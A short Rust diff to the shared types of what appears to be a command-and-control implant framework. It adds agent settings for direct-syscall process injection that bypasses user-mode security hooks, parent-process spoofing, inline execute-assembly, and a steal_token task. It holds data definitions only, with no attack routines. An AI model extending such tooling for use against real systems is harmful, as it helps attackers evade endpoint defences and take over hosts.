@@ -19,8 +19,8 @@ pub struct RegisterReq {
 #[derive(Debug, Clone, Serialize, Deserialize)]
 pub struct RegisterResp {
     pub status: String,
+    #[serde(default)]
     pub message: String,
-    pub token: String,
 }
 
 /// Task type discriminator for commands.
@@ -179,6 +179,9 @@ pub struct ExecuteAssemblyTask {
     /// Command-line arguments passed to Main(string[] args).
     #[serde(default)]
     pub args: Vec<String>,
+    /// Run in current process (true) or spawn sacrificial process (false, default).
+    #[serde(default)]
+    pub inline: bool,
 }
 
 /// steal_token payload — JSON-encoded in Command.command.
@@ -215,6 +218,12 @@ pub struct AgentConfig {
     /// Default process to spawn for spawn+inject (e.g. "C:\\Windows\\System32\\svchost.exe").
     #[serde(default)]
     pub spawn_process: Option<String>,
+    /// Use direct Nt* syscalls instead of Win32 API for injection (bypasses user-mode hooks).
+    #[serde(default)]
+    pub use_syscalls: bool,
+    /// PPID spoof parent process name (e.g. "explorer.exe"). None = no spoofing.
+    #[serde(default)]
+    pub ppid_spoof: Option<String>,
 }
 
 // ─── Shared API response DTOs (server → CLI) ───
